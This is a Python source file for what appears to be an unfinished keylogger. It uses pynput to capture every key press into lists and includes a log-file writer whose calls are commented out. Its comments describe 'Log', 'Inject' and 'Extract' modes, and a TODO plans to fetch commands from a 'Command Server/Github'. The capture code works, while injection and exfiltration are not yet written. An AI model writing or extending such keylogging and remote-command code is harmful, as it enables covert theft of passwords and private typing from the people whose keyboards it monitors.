import datetime
import os
from pynput import keyboard
import sys 
import time
from typing import List, Dict



# shared flag that port.py will modify
typing_active = False

class KeyboardHandler:

    def __init__(self, mode="L", log_file="log.txt"):
        # Are we in keyloggin mode or in key injection mode? 
        # What mode are we in ? Log -> L, Inject -> I , Extract -> E (Default mode is Log):
        self.mode = mode

        # Set a time range for what is one sitting of typing:
        self.time_range_for_till_inactive= 30 #  Time in Seconds
        self.time_last_logging = 0 #  Time in Seconds

        # time.strftime("%H:%M:%S", time.localtime())
        self.start_time_of_logging = time.strftime("%H:%M:%S", time.localtime())
        self.last_press_time = 0

        self.keystrokes_recorded = list()
        self.keystrokes_recorded_size = 100

        self.log_file = log_file
        self.keys = []

        # TODO: WIP: Writing a chace line and cache block implementation to read the keystrokes and evicting based on time
        # At the moment using keystrokes_recorded list! Like before!
        self.keystrokes_cache = dict()
        self.keystrokes_cache_size = 100

    def start(self):
        """ Starts the keyboard listener as a thread to record  keystrokes"""
        with keyboard.Listener(
            on_press=self.on_press,
            on_release=self.on_release) as listener:
            listener.join()

    # ========== Functions for key Logging ==========:
    def on_press(self, key):
        # Calculate the time difference since the last key press
        current_time = time.time()
        time_since_last_press = current_time - self.last_press_time

        # Print or log the time since the last key press
        print(f"Time since last key press: {time_since_last_press:.2f} seconds")

        # Update the last key press time
        self.last_press_time = current_time
        # skip logging if port.py is injecting keystrokes
        if self.mode == "I": # Starting  Key Injection mode
            return

        try:
            char = key.char
            self.keystrokes_recorded.append(char)
            # self.write_to_file(char)
        except AttributeError:
            special_key = f'[{key.name}]'
            print(file=sys.stderr)
            self.keys.append(special_key)
            # self.write_to_file(special_key)


    # ========== Functions for key injection ==========:
    # TODO: ADD code for reading the commands from Command Server/Github, what do I run?

    # ========== Functions for key extraction ==========:
    def write_to_file(self, key_data): 
        with open(self.log_file, 'a') as f:
            f.write(key_data)

    def on_release(self, key):
        if key == keyboard.Key.esc:
            print("\n\n[DEMO STOPPED] ESC key pressed")
            return False

def main():
    monitor = KeyboardHandler()
    monitor.start()

if __name__ == "__main__":
    main()
